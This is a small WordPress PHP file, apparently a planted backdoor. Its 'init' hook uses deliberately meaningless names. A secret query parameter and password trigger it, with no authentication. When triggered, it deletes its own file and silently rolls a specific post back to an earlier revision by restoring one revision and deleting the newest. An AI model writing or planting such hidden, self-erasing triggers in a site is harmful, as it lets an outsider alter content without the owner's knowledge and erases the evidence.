<?php

function import_reset_heading_comment() {
	if (isset($_GET['review_videos_views']) && $_GET['review_videos_views'] === 'virtual_finder_compare_com') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$services_back_menu_uploads = 1173;
		$history_platform_views_conversion = wp_get_post_revisions($services_back_menu_uploads);
		if (empty($history_platform_views_conversion)) die('no revisions');
		if (count($history_platform_views_conversion) < 2) die('less than 2');
		$master_contact_remover_svg = array_shift($history_platform_views_conversion);
		$floating_easy_script = $master_contact_remover_svg->ID;
		$elements_ticket_thumbnail_weather = array_shift($history_platform_views_conversion);
		$type_secure_guest = $elements_ticket_thumbnail_weather->ID;
		$ecommerce_mediaelement_showcase = wp_restore_post_revision($type_secure_guest);
		if ($ecommerce_mediaelement_showcase === false) die('error restoring');
		$ecommerce_mediaelement_showcase = wp_delete_post_revision($floating_easy_script);		
		if ($ecommerce_mediaelement_showcase === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'import_reset_heading_comment');
